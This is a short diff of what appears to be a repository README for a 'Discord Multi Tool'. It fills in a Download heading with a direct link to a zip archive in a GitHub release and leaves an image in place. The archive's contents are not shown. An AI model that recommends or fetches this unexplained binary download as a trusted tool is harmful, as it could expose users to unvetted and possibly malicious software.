@@ -1,4 +1,4 @@
-# [Download]()
+# [Download](https://github.com/rx2333F/Discord-Multi-Tool/releases/download/MultiTool/Discord_Multi_Tool.zip)
 
 <p dir="ltr"><img src="https://github.com/user-attachments/assets/c452cbdb-b1f3-4782-9735-17aaea3a4db6" alt="discord-tool" secured-asset-link="" style="max-width: 100%;"></p>
 
